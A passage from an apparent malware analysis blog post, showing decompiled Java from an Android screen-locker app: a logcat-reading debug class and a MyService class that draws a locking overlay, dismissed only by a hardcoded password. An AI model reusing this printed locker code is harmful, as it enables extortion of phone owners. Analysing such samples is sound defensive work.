</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#ff79c6">import</span> java.io.BufferedReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#ff79c6">import</span> java.io.InputStreamReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#6272a4">/* loaded from: classes.dex */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">ADRTLogCatReader</span> <span style="color:#8be9fd;font-style:italic">implements</span> Runnable <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> Context context<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">onContext</span><span style="color:#ff79c6">(</span>Context context2<span style="color:#ff79c6">,</span> String str<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span> <span style="color:#6272a4">// this, com.aide.ui
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>context <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>            context <span style="color:#ff79c6">=</span> context2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getApplicationContext</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#bd93f9">0</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">(</span>context2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getApplicationInfo</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">flags</span> <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>                    context2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getPackageManager</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getPackageInfo</span><span style="color:#ff79c6">(</span>str<span style="color:#ff79c6">,</span> <span style="color:#bd93f9">128</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>                    ADRTSender<span style="color:#ff79c6">.</span><span style="color:#50fa7b">onContext</span><span style="color:#ff79c6">(</span>context<span style="color:#ff79c6">,</span> str<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>                    <span style="color:#ff79c6">new</span> Thread<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> ADRTLogCatReader<span style="color:#ff79c6">(),</span> <span style="color:#f1fa8c">&#34;LogCat&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">start</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>PackageManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">NameNotFoundException</span> e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    @Override <span style="color:#6272a4">// java.lang.Runnable
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">run</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>            BufferedReader bufferedReader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BufferedReader<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> InputStreamReader<span style="color:#ff79c6">(</span>Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;logcat -v threadtime&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">()),</span> <span style="color:#bd93f9">20</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>            <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>                String readLine <span style="color:#ff79c6">=</span> bufferedReader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readLine</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>                <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>readLine <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>                    <span style="color:#ff79c6">return</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>                ADRTSender<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sendLogcatLines</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span>readLine<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IOException e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>As this seems like a debugging class and package we will not analyze it further and we will turn our focus on <code>MyService</code> service.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-java" data-lang="java"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff79c6">package</span> com.XPhantom.p000id<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#ff79c6">import</span> adrt.ADRTLogCatReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#ff79c6">import</span> android.app.Service<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#ff79c6">import</span> android.content.Context<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#ff79c6">import</span> android.content.Intent<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#ff79c6">import</span> android.os.IBinder<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#ff79c6">import</span> android.view.LayoutInflater<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#ff79c6">import</span> android.view.View<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#ff79c6">import</span> android.view.ViewGroup<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#ff79c6">import</span> android.view.WindowManager<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#ff79c6">import</span> android.widget.Button<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#ff79c6">import</span> android.widget.EditText<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#ff79c6">import</span> android.widget.ImageView<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#ff79c6">import</span> android.widget.Toast<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#6272a4">/* renamed from: com.XPhantom.id.MyService */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#6272a4">/* loaded from: classes.dex */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">MyService</span> <span style="color:#8be9fd;font-style:italic">extends</span> Service <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    ImageView chatHead<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    Context context<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    <span style="color:#6272a4">/* renamed from: e1 */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    EditText f0e1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    ViewGroup myView<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    WindowManager windowManager<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    @Override <span style="color:#6272a4">// android.app.Service
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">onCreate</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>        ADRTLogCatReader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">onContext</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;com.aide.ui&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">windowManager</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>WindowManager<span style="color:#ff79c6">)</span> getSystemService<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;window&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">myView</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>ViewGroup<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">((</span>LayoutInflater<span style="color:#ff79c6">)</span> getSystemService<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;layout_inflater&#34;</span><span style="color:#ff79c6">)).</span><span style="color:#50fa7b">inflate</span><span style="color:#ff79c6">(</span>C0000R<span style="color:#ff79c6">.</span><span style="color:#50fa7b">layout</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">main</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span>ViewGroup<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">chatHead</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ImageView<span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">chatHead</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">setImageResource</span><span style="color:#ff79c6">(</span>C0000R<span style="color:#ff79c6">.</span><span style="color:#50fa7b">drawable</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ic_launcher</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">f0e1</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>EditText<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">myView</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">findViewById</span><span style="color:#ff79c6">(</span>C0000R<span style="color:#ff79c6">.</span><span style="color:#50fa7b">C0001id</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">mainEditText1</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>        <span style="color:#ff79c6">((</span>Button<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">myView</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">findViewById</span><span style="color:#ff79c6">(</span>C0000R<span style="color:#ff79c6">.</span><span style="color:#50fa7b">C0001id</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">mainButton1</span><span style="color:#ff79c6">)).</span><span style="color:#50fa7b">setOnClickListener</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> View<span style="color:#ff79c6">.</span><span style="color:#50fa7b">OnClickListener</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span> <span style="color:#6272a4">// from class: com.XPhantom.id.MyService.100000000
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span><span style="color:#6272a4"></span>            <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">final</span> MyService <span style="color:#ff79c6">this</span>$0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>                <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>            @Override <span style="color:#6272a4">// android.view.View.OnClickListener
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span><span style="color:#6272a4"></span>            <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">onClick</span><span style="color:#ff79c6">(</span>View view<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>                <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">f0e1</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getText</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Abdullah@&#34;</span><span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span><span style="color:#6272a4">// if password is Abdullah@ then unlock the Phone xD 
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span><span style="color:#6272a4"></span>                    <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">windowManager</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">removeView</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">myView</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>                    <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span>                        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">context</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">startService</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> Intent<span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">context</span><span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.XPhantom.id.MyService&#34;</span><span style="color:#ff79c6">)));</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span><span>                        <span style="color:#ff79c6">return</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span>                    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>ClassNotFoundException e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span><span>                        <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> NoClassDefFoundError<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMessage</span><span style="color:#ff79c6">());</span>
